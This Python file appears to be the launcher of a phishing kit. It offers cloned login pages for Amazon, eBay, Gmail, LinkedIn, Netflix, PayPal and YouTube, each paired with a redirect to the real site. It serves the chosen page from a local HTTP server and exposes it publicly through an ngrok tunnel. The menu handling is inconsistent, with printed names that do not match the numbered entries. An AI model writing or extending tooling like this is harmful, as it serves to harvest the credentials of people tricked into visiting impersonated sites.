from utils import print_welcome_message, get_ip_info
from dotenv import load_dotenv
import ngrok
import os
import subprocess


load_dotenv()

sites = {
    "1": {"name": "Amazon", "html": "apps/amazon/amazon.html", "redirect": "https://amazon.com"},
    "2": {"name": "Ebay", "html": "apps/ebay/ebay.html", "redirect": "https://ebay.com"},
    "3": {"name": "Gmail", "html": "apps/gmail/gmail.html", "redirect": "https://mail.google.com"},
    "4": {"name": "LinkedIn", "html": "apps/linkedin/linkedin.html", "redirect": "https://linkedin.com"},
    "5": {"name": "YouTube", "html": "apps/youtube/youtube.html", "redirect": "https://youtube.com"},
    "6": {"name": "Netflix", "html": "apps/netflix/netflix.html", "redirect": "https://netflix.com"},
    "7": {"name": "PayPal", "html": "apps/paypal/paypal.html", "redirect": "https://paypal.com"},
}

def start_ngrok():
    server_process = subprocess.Popen(["python", "-m", "http.server", "8000"])
    try:
        ngrok.set_auth_token(os.getenv("NGROK_AUTHTOKEN"))
        ngrok_tunnel = ngrok.connect('8000', proto="http")
        return ngrok_tunnel.public_url
    except Exception as e:
        print(f"ngrok error: {e}")
        return None


def main():
    print_welcome_message()

    for key, value in sites.items():
        print(f"[{key}] {value['name']}")

    choice = input("Insert your choice: ")

    if choice == "1":
        print("you choose Amazon")
        print(start_ngrok())
    elif choice == "2":
        print("you choose Ebay")
    elif choice == "3":
        print("you choose Linkedin")
    elif choice == "4":
        print("you choose Netflix")
    else:
        print("Invalid choice")

if __name__ == "__main__":
    main()